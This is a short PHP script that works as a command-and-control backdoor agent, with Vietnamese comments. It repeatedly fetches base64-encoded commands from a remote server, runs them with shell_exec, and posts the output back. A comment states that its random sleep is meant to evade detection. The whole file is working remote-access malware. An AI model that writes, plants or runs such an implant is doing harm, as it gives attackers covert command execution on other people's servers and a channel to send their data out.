<?php

$c2 = "http://httpconnection.local:8000";
$hostname = gethostname();

while (true) {
    // Lấy lệnh từ server
    $opts = [
        "http" => [
            "method" => "GET",
            "header" => "X-Hostname: $hostname\r\n"
        ]
    ];
    $ctx = stream_context_create($opts);
    $cmd_b64 = file_get_contents("$c2/getcmd", false, $ctx);
    $cmd = base64_decode($cmd_b64);

    if (!empty($cmd)) {
        echo "[+] Command: $cmd\n";

        // Thực thi lệnh
        $output = shell_exec($cmd);

        // Gửi kết quả
        $result_b64 = base64_encode($output);
        $opts = [
            "http" => [
                "method" => "POST",
                "header" => "X-Hostname: $hostname\r\nContent-Type: text/plain\r\n",
                "content" => $result_b64
            ]
        ];
        $ctx = stream_context_create($opts);
        file_get_contents("$c2/postresult", false, $ctx);
    }

    sleep(rand(3, 6));  // Random delay để tránh bị phát hiện
}
?>
